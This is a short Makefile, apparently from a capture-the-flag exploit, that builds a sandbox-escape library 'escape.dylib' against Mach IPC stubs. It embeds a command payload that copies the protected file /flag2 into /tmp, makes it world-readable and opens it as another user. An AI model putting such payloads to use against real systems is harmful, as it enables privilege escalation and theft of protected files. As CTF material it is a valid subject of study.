CC = clang

.PHONY: all
all: escape.dylib tester

escape.dylib: escape.c
	$(CC) -shared -o escape.dylib '-DPAYLOAD="cp /flag2 /tmp/flag; chmod 777 /tmp/flag; sudo -u c3ctf open -a TextEdit /tmp/flag"' escape.c -I ../pillow ../pillow/mig/capsdServer.c ../pillow/mig/shelldUser.c

tester: tester.c
	$(CC) -o tester tester.c
